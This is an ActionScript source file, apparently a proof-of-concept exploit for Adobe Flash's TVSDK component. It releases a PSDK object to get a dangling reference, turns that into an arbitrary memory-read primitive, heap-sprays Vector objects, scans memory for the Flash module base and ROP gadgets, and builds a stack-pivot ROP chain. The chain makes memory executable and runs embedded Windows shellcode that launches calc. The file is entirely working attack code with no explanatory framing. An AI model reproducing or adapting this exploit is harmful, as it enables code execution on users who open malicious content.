package {
	import com.adobe.tvsdk.mediacore.PSDK;
	import com.adobe.tvsdk.mediacore.info.Track;
	import com.adobe.tvsdk.mediacore.metadata.Metadata;
	
	import flash.display.Sprite;
	import flash.utils.ByteArray;
	import flash.utils.Endian;
	
	public class exploit extends Sprite{
		public var ulimit_bytes:ByteArray;
		public var output:String;
		public var track:Track;
		public var gc_arr:Array;
		public var fill_bytes:ByteArray;
		public var shellcode:ByteArray;
		public function exploit()
		{	
			run();
		}
		
		public function readmemory(ps:PSDK, mt:Metadata, address:uint):uint
		{			
			fill_bytes.position = 0x10; 
			fill_bytes.writeUnsignedInt(address);
			mt.setByteArray("jack", fill_bytes);
			output = track.language;
			if(output.length != 4)
			{
				var res:uint = output.charCodeAt(0);
				fill_bytes.position = 0x10;
				fill_bytes.writeUnsignedInt(address+1);
				mt.setByteArray("jack", fill_bytes);
				res+=track.language.charCodeAt(0)<<8;
				fill_bytes.position = 0x10;
				fill_bytes.writeUnsignedInt(address+2);
				mt.setByteArray("jack", fill_bytes);
				res+=track.language.charCodeAt(0)<<16;
				fill_bytes.position = 0x10;
				fill_bytes.writeUnsignedInt(address+3);
				mt.setByteArray("jack", fill_bytes);
				res+=track.language.charCodeAt(0)<<24;
				return res;
			}
			else
			{
				return (output.charCodeAt(3)<<24) + (output.charCodeAt(2)<<16) + (output.charCodeAt(1)<<8) + (output.charCodeAt(0));				
			}
		}
		
		public function wrapper():void
		{	
			//Pepare the memory
			var ps:PSDK = PSDK.pSDK;
			var mt:Metadata = new Metadata();
			var value:uint;
			ps.release();
			track = new Track("j","lan",true,true);
			ps.createDispatcher();
			//find this
			var base:uint = 0x0ae20020; // win7
			while(!(readmemory(ps, mt, base+8)==readmemory(ps, mt, base+0x10) && 0!=readmemory(ps, mt, base+0x0C)))
				base+=0x1000;
			var this_addr:uint = readmemory(ps, mt, base+0x10) - 1;
			
			//find flash base
			var flash_base:uint = readmemory(ps, mt, base) & 0xffff0000;
			while(readmemory(ps, mt, flash_base)!=0x00905A4D)
				flash_base-=0x10000;

			//FF 70 F8 FF 70 FC
			//find gadget
			base = flash_base+0x1000;
			var flag:uint = 0;
			var memory_rx_func:uint = 0;
			var stackpivot:uint = 0;
			var cheax:uint = 0;
			while(flag!=0x111)
			{
				value = readmemory(ps, mt, base);
				if(value==0xfff870ff)
				{
					flag|=0x100;
					memory_rx_func = base-2;
				}
				else if(value==0xC35B5E94) //XCHG EAX,ESP # POP ESI # POP EBX # RETN 
				{
					flag|=0x10;
					stackpivot = base;
				}
				else if((value&0xFFFF)==0xC396) // XCHG EAX, ESI # RETN
				{
					flag|=0x1;
					cheax = base;
				}
				base++;
			}	
			
			//find buffer
			base = this_addr;
			base+=0x54;
			base = readmemory(ps, mt, base);
			base+=0x44;
			base = readmemory(ps, mt, base);
			base+=8;
			var buffer_addr:uint = readmemory(ps, mt, base);
			
			
			//find shellcode
			base = this_addr;
			base+=0x68;
			base = readmemory(ps, mt, base);
			base+=0x44;
			base = readmemory(ps, mt, base);
			base+=8;
			var shellcode_addr:uint = readmemory(ps, mt, base);
			shellcode.writeUnsignedInt(0xBEE68790);
			shellcode.writeUnsignedInt(buffer_addr);
			
			//vtable
			fill_bytes.position = 4;
			fill_bytes.writeUnsignedInt(buffer_addr);
			
			//rop chain
			ulimit_bytes.position = 0;
			ulimit_bytes.writeUnsignedInt(buffer_addr+0x1C); // ESI
			ulimit_bytes.writeUnsignedInt(stackpivot); 
			ulimit_bytes.writeUnsignedInt(cheax);
			ulimit_bytes.writeUnsignedInt(memory_rx_func);
			ulimit_bytes.writeUnsignedInt(shellcode_addr);
			ulimit_bytes.writeUnsignedInt(0x1000);
			ulimit_bytes.writeUnsignedInt(shellcode_addr);

			mt.setByteArray("jack", fill_bytes);
		}
		
		public function spray():void
		{
			gc_arr = new Array();
			var i:int = 0;
			var j:int = 0;
			for(i=0;i<0x6000;i++)
			{
				gc_arr[i]=new Vector.<Object>((0x1000-0x28)/4);
				for(j=0;j<(0x1000-0x28)/4;j++)
				{
					gc_arr[i][j]=this;
				}
			}
		}
		
		public function run():void
		{
			fill_bytes = new ByteArray();
			fill_bytes.endian = Endian.LITTLE_ENDIAN;
			fill_bytes.length = 0x20;
			fill_bytes.position = 0x0c;
			fill_bytes.writeUnsignedInt(4);
			ulimit_bytes = new ByteArray();
			ulimit_bytes.endian = Endian.LITTLE_ENDIAN;
			ulimit_bytes.length = 0x1000;
			var shellstring:String = "\x60\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7\x58\x58\x61\xC2\x04\x00\x00";
			shellcode = new ByteArray();
			shellcode.position = 8;
			shellcode.endian = Endian.LITTLE_ENDIAN;
			shellcode.writeMultiByte(shellstring, "iso-8859-1");
			shellcode.length = 0x1000;
			shellcode.position = 0;
			spray();
			wrapper();
		}
	}
}